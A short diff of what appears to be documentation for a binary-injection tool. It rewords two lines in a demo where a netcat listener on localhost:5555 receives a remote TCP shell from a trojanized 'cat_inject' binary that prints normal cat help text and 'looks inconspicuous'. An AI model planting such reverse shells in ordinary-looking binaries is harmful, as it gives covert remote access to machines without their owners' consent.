@@ -101,7 +101,7 @@ Setting up a listener on localhost:5555:
 nc -l localhost 5555
 ```
 
-Then run the injected cat binary:
+Then run the injected cat binary, it looks inconspicuous! but...
 ```
 ./cat_inject --help
 Usage: ./cat_inject [OPTION]... [FILE]...
@@ -132,7 +132,7 @@ Full documentation <https://www.gnu.org/software/coreutils/cat>
 or available locally via: info '(coreutils) cat invocation'
 ```
 
-Now the netcat listener has a remote TCP shell:
+Now the netcat listener has a remote TCP shell!
 ```
 nc -l localhost 5555
 whoami
